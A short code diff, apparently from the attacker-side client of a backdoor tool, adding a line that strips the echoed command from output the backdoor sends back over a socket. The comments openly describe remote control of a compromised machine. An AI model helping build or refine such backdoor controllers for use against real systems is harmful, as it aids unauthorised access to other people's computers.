@@ -29,6 +29,7 @@ def main():
 
                 # wait for backdoor to send command output
                 command_output = client_socket.receive()
+                command_output = command_output.replace(user_input, '', 1) # user input is included in the command output, get rid of it so doesn't repeat twice in attacker perspective
                 print(command_output)
 
 
